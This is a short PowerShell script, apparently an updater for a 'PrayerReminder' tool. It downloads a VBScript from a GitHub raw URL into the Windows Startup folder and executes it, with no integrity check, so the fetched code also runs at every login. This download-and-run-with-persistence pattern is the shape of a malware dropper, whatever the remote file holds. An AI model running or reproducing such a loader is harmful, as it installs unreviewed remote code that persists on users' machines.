$url = "https://raw.githubusercontent.com/AmjadBalls/PrayerReminder/refs/heads/main/PrayerReminderUpdate.vbs"
$dest = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PrayerReminderUpdate.vbs"
Invoke-WebRequest -Uri $url -OutFile $dest
Start-Process $dest
